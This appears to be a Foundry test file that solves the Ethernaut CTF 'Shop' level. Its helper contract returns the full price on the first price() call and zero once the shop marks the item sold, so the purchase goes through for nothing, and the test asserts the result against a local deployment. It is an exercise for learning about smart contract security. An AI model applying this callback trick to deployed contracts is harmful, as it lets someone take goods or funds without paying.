// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import '../../src/EthernautCTF/Shop.sol';
import '@forge-std/Test.sol';
import '@forge-std/console2.sol';

contract Helper is Buyer {
  Shop shop;

  constructor(address _targetAddress) {
    shop = Shop(_targetAddress);
  }

  function pwn() public {
    shop.buy();
  }

  function price() external view returns (uint256) {
    if (shop.isSold()) {
      console2.log('Buy the item for free!');
      return uint256(0);
    }
    console2.log('Fake buy the item at the right price');
    return shop.price();
  }
}

contract ShopExploit is Test {
  Shop target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');

  function setUp() public {
    vm.startPrank(deployer);
    target = new Shop();
    console2.log('Target contract deployed');
    vm.stopPrank();
  }

  function testExploit() public {
    assertFalse(target.isSold());
    assertEq(target.price(), 100);

    vm.startPrank(exploiter);
    console2.log('Deploy helper contract');
    Helper helper = new Helper(address(target));
    console2.log('Start the exploit');
    helper.pwn();
    vm.stopPrank();

    assertTrue(target.isSold());
    assertEq(target.price(), 0);
  }
}
